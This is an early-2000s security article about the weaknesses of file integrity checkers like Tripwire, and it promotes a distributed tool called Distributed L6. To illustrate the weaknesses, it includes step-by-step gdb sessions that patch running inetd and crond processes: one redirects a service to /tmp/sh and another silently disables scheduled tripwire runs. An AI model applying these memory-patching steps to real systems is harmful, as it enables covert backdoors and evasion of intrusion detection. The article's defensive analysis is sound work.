---
title: "Trusted Data Integrity Auditing"
date: 2003-07-26T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-20"
---

[quack](https://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=5) (quack_at_xfocus.org)

Trusted Data Integrity Auditing 

--------------------------------------------------------------------------------

Julien Palardy, julien.palardy@videotron.ca

 


Introduction 


Recently, a document related to file system integrity audit tools was published by Jeremy Rauch on Securityfocus.com [1]. After a brief reading, I could not avoid observing the critical - although very accurate - conclusion it drew on such tools and their position in an intrusion detection environment. This paper, which was making use of Tripwire and AIDE as examples of the file system integrity audit concept, demonstrated very well how much that kind of technology still requires a lot of development. 


The following document will, however, present things on a very different point of view. By demonstrating the use of a new tool called Distributed L6, we will both take a look at what failures plague the current file system checking scheme and how this new software corrects them by discussing the following: 


Integrity inspection coverage

How Distributed L6 exceeds where most tools fail to fulfil their task; 


Centralisation of trusted components

How Distributed L6 lowers the risk of seeing its own components being compromised in an intrusion; 


Kernel-based protection in hostile environments

How Distributed L6 puts the final touch in securing the components which remain on the potentially compromised host. 


It is not worth securing a door when there are no walls 


The first failure of most file system integrity tools is the fact that they are only file system integrity tools. Although many intrusions will effectively result in the alteration of file system objects, some of them may not. It does, in many situations, happen that a single compromised host will only be used by an intruder for a very short laps of time, and it might not be necessary to modify the file system when it would be easier to modify the kernel or running processes, and remove all evidence from the file system itself. This brings a whole new signification to system integrity. We are not only talking about files anymore, but about everything from static to dynamic data and code, on both volatile and non-volatile memory. Most tools, if not all, do not take that into account and blatantly ignore the fact that the operating system might be lying to them!. 


Attacking a system by modifying the memory content of a critical process could be illustrated, as an example, by hijacking a service provided by the inetd daemon. This can be easily done by retrieving the position in memory of the first argument passed to execv() by inetd when executing the in.identd daemon, for exemple, in the following way: 


 


    # grep auth /etc/inetd.conf

    auth    stream  tcp     nowait  root    /usr/sbin/in.identd 

    in.identd -e -o

    # objdump --headers /usr/sbin/inetd|grep " .bss "

     21 .bss          000004e0  0804d0c0  0804d0c0  000040c0  2**5

    # ps -ef | grep inetd | awk -e '{print $2}'

    928

    # echo "x/10000s 0x0804d0c0" > todo

    # gdb /usr/sbin/inetd 928 < todo | grep /usr/sbin/in.identd


    /root/715: No such file or directory.

    0x804e748:       "/usr/sbin/in.identd"

    # 


 


Once this has been done, it becomes trivial to modify the string to make inetd execute an arbitrary file instead of the original in.identd, without breaking the monitored files on the file system at all: 


 


    # gdb /usr/sbin/inetd 928

    GNU gdb 4.18

    [...]

    This GDB was configured as "i386-unknown-linux"...

    (no debugging symbols found)...


    /root/928: No such file or directory.

    Attaching to program: /usr/sbin/inetd, Pid 928

    Reading symbols from /lib/libc.so.6...done.

    Reading symbols from /lib/ld-linux.so.2...done.

    Reading symbols from /lib/libnss_files.so.2...done.

    0x400c154e in __select () from /lib/libc.so.6

    (gdb) x/1s 0x804e748

    0x804e748:       "/usr/sbin/in.identd"

    (gdb) set *((u_long *)0x804e748+0) = 0x706d742f

    (gdb) set *((u_long *)0x804e748+1) = 0x0068732f

    (gdb) x/1s 0x804e748

    0x804e748:       "/tmp/sh"

    (gdb) q

    The program is running.  Quit anyway (and detach it)? (y or n) y

    Detaching from program: /usr/sbin/inetd, Pid 928

    #


 


Then only remains the verification of our alteration: 


 


    # cat > /tmp/sh

    #!/bin/sh

    echo hi

    ^C

    # chmod 755 /tmp/sh

    # telnet localhost 113

    Trying 127.0.0.1...

    Connected to localhost.localdomain.

    Escape character is '^]'.

    hi

    Connection closed by foreign host.

    #


 


Of course, one could argue that implementing a real backdoor which would include code insertion into the process memory space is a lot more tricky. It is not. It has been known and done for pretty long already, and nothing currently protects you from this. 


In order to solve this problem, we will want both portable and flexible memory content verification added to our file system verification capability. Today, portability is being reached more and more through the use of /proc node and /dev/kmem memory space maps. Making ptrace calls obsolete when it comes to fetching data from a process address space, they usually provide a good atomic snapshot of what we want to verify within a single process. As for flexibility, we definitely do not want our data inspection methods to result into constant alert emission due to normal modification of data within a process memory space. For this reason, we will want to base ourselves on both binary file sections and symbols in order to define contiguous segments of data to audit. Using this method, we would be able, for example, to verify the authenticity of the system call handlers in place with a Solaris 2.x kernel by verifying the sysent table, or assure the integrity of the dynamic library calls from a process by checking its procedure linkage table. 


Distributed L6 uses these principles to provide complete system integrity assurance, including flexible process, data and file integrity. Feeding it with process or kernel memory specifications which can include a starting address, symbol or section name with an optional segment length to be verified will enable the administrator to keep track of memory content and its alteration for both security and development purposes. 


Taking that into account, it becomes fairly simple to perform basic kernel and process integrity verifications. Lets consider the following example: 


 


    # cat /etc/security/L6/alert.conf

    TRIVIAL: "%LEVEL alert: object %OBJECT has been %STATE" > stdout

    CRITICAL: "%LEVEL alert on %HOST\n   %OBJECT has been %STATE\n  

         old hash = %OLDHASH\n   new hash = %NEWHASH\n" > stdout

    # echo "TRIVIAL localhost kernel[sysent]" >> files

    # echo "CRITICAL localhost inetd[.text]" >> files

    # l6-manager -u < files

    # modload trojan.o

    # kill -9 `ps -ef | grep inetd | awk -e '{print $2}'`

    # ./myinetd

    # l6-manager -v < files

    TRIVIAL alert: object kernel[sysent] has been modified

    CRITICAL alert on ipdev

           inetd[.text] has been modified

           old hash = 5bc5c016c10d1d8a35e673f19b83af7c

           new hash = abe02f0b347eda2a71aba4462646fea7

    #


 


In the previous demonstration, we successfully detected modifications made to both inetd's process executable code and to the kernel's system call table. This simple kind of memory inspection method can make a lot of difference when it comes to detecting intruders who use hostile kernel modules [2] more and more frequently to retain control over their newly penetrated targets. 


Never mix the ones you trust with the ones you don't 


Another obvious problem with tools like Tripwire is the fact that there are a high number of possibilities for an intruder to tamper with the supposedly trusted file system integrity audit components. Such components are the ones that define the system's behavior and ability to efficiently detect data adulteration. In the case of Tripwire, those will usually include configuration files, signature databases and secret keys used to sign them, executable binaries and system libraries they rely on, and finally, the kernel. In addition to this, we also want to include the process in which results in the execution of the trusted executable binaries, which will usually consist in a miscellaneous shell like ksh or a task managing daemon like crond. If any of these are to be compromised by either inserting a hostile kernel module [3], hooking symbols within a dynamic library [4], modifying the parent process by hijacking dynamic calls from its procedure linkage table [5], or more simply by altering the signature database and rebuilding its signature with a captured key, the complete file system integrity audit scheme gets broken. 


A practical example of attack whose goal would be to take down an automatic filesystem verification scheme based on the execution of tripwire by a daemon like crond could be similar to the one shown previously. Not only would it disable the execution of tripwire by crond, but it would also leave no trace on the filesystem itself, and thus make the criminal evidence retrieving process a lot harder: 


 


    # grep tripwire /etc/crontab

    01 * * * * root /usr/local/sbin/tripwire

    # objdump --headers /usr/sbin/crond | grep ' .bss '

     21 .bss          00000140  0804de60  0804de60  00004e60  2**5

    # ps -aux|grep crond|awk -e '{print $2}'

    875

    # echo "x/10000s 0x0804de60" > todo

    # gdb /usr/sbin/crond 875 < todo | grep /usr/local/sbin/tripwire


    /root/875: No such file or directory.

    0x804f700:       "/usr/local/sbin/tripwire"

    # gdb /usr/sbin/crond 875

    GNU gdb 4.18

    [...]

    (no debugging symbols found)...


    /root/875: No such file or directory.

    Attaching to program: /usr/sbin/crond, Pid 875

    Reading symbols from /lib/libc.so.6...done.

    Reading symbols from /lib/ld-linux.so.2...done.

    Reading symbols from /lib/libnss_files.so.2...done.

    Reading symbols from /lib/libnss_nisplus.so.2...done.

    Reading symbols from /lib/libnsl.so.1...done.

    Reading symbols from /lib/libnss_nis.so.2...done.

    0x400a67f1 in __libc_nanosleep () from /lib/libc.so.6

    (gdb) x/1s 0x804f700

    0x804f700:       "/usr/local/sbin/tripwire"

    (gdb) call strcpy(0x804f700, "/bin/echo")

    $1 = 0x804f700 "/bin/echo"

    (gdb) x/1s 0x804f700

    0x804f700:       "/bin/echo"

    (gdb) quit

    The program is running.  Quit anyway (and detach it)? (y or n) y

    Detaching from program: /usr/sbin/crond, Pid 875

    #


 


In order to remedy to this problematic situation, the first thing we will want to do is reduce the number of trusted components the intruder gets in contact with. To achieve this goal, we will want to use concrete methods, which will prevent the intruder from extending its control over the most valuable parts of your data integrity audit system. Concrete methods will usually refer to absolute methods, as opposed to tactics whose goals are to slow down the intruder, like database encryption and signature, which obviously becomes a matter of time before being compromised when implemented in a closed, single host environment. The most interesting "concrete" method is the use of network compartments. By moving the signature databases, configuration files and the signature analysis process from the tainted or compromised host to a secure and preferably firewalled host, we significantly reduce the alteration risk of the most trusted components of our system. 


Distributed L6 performs this by dividing its processes into the concepts of managers (secure) and nodes (insecure). Making the node process as lightweight as possible is essential in elevating the trust the administrator can have into the whole data integrity audit system. We can think of smap for sendmail, which was a secure front-end to sendmail, which was quite tiny in size and easier to guarantee the code's sanity on a security point of view. For this same reason, L6-node's responsiblity simply consists in gathering information about files and computing hashes of file and memory content, while L6-manager performs the whole signature database update and verification process. When communicating with each other, the multiple processes make use of a blowfish encrypted communication channel, which will protect the confidentiality regarding what files are verified on a specific host. Another advantage in Distributed L6 communication scheme is the fact that is does not act as a service but as a client. L6-manager is the one initiating the connection towards a host it wishes to monitor, making it ideal for modern firewalled environments. Running on a secure host, L6-manager will be able to perform integrity verifications remotely upon request without raising the risk of your trusted host to be compromised. 


Removing the signature analysis task from the potentially compromised host to a centralised bastion really is the key to Distributed L6, and also what will permit the administrator to sleep eyes closed without worrying about his integrity inspection system's reliability. 


Never build a marble palace on wooden foundations 


Finally, there still remains the information gathering and hashing process on the compromised host, thing which could make our whole security concept crumble. As a matter of fact, the intruder could decide to subvert the process into making it return falsified snapshots of the original data and file information. This could be done either by replacing or modifying the process, or simply by hooking its file system related calls to dynamic libraries in order to make it see a spoofed environment, which, obviously, would not be representative of the truth. 


This problem, unlike the others, should be pretty trivial to fix. In reality, it is only a matter of tying it all to some kind of physical security, which would be, in the current case, kernel-based protection and the necessity to reboot the host in order to modify the process, or get access to the channel's secret key. Most of the facilities required to use this concept will usually be provided with most operating systems. Using static compiling, instant dynamic symbol resolution, load-on-boot process execution and BSD/Linux secure levels will fix a big part of the problem. Other solutions can also be implemented using kernel modules, such as for preventing our process from being killed or modified. 


Distributed L6 relies on many of such facilities and easy-to-implement concepts. The first step in eliminating such problems was writing the L6-node service as a "loaded once" daemon, independent from inetd. Then, this process only has to be protected from external influence within this very host, like ptrace attempts and non-manageable signals. This is done by loading the L6-kprotect kernel module, which will both protect itself from being unloaded and L6-node from being attacked. Thereafter only remains the secret key stored on the compromised host. By giving the secret key's file a specific mode (chmod) and assigning it the immutable flag (chflags), the secure levels implemented on some operating systems will enforce the previously given modes until the host reboots. For any other operating system, L6-kprotect simply prevents read-write attempts to the secret key, thing which is, however, not as flexible as the use of secure levels. 


To summarize, in order to protect L6-node efficiently, L6-kprotect would be required to answer the following needs: 


Removal of access to kernel module control facilities; 

Removal of write access to /dev/kmem and /dev/mem; 

Removal of any access to /proc/[l6-node-pid]/[as|mem]; 

Removal of capability to ptrace l6-node; 

Removal of capability to send signals to l6-node; 

Removal of any access to the node's host key. 

The previous list would have been much longer if we would have been required to isolate a tool such a Tripwire from the intruder who compromised the host. Once loaded, the presence L6-kprotect results in something similar to the following example: 


 


    # id 

    uid=0(root) gid=1(other)

    # ps -ef | grep l6-node | awk -e '{print $2}'

    221

    # kill -9 221

    211: Permission denied

    # echo quit|gdb /dev/null 221 2>&1|grep ptrace

    ptrace: Permission denied

    # cat /etc/security/L6/host.key

    /etc/security/L6/host.key: Permission denied

    #


 


Conclusion 


In a brief review, we have observed the importance of applying strong security policies in designing system integrity software. Far from what one could think, reliable security tools must not only help in improving the trustworthiness of your network, but they must also fulfil their pretensions. As a matter of fact, software wrongfully pretending to fulfil a specific task can often reveal being much more dangerous than helpful, mostly when implemented in business environments, where managers tend to blindly follow subversive marketing. Security isn't magic, but there sure seems to be a lot of magicians around. 


References 


Rauch, Jeremy, Basic File Integrity Checking,

Securityfocus.com, 2000. 


plaguez, Weakening the Linux Kernel,

Phrack Magazine, Issue #52, 1998. 


halflife, Bypassing Integrity Checking Systems,

Phrack Magazine, Issue #51, 1997. 


klog, Backdooring Binary Objects,

Phrack Magazine, Issue #56, 1999. 


silvio, Shared Library Redirection via ELF PLT Infection,

Phrack Magazine, Issue #56, 1999. 


--------------------------------------------------------------------------------
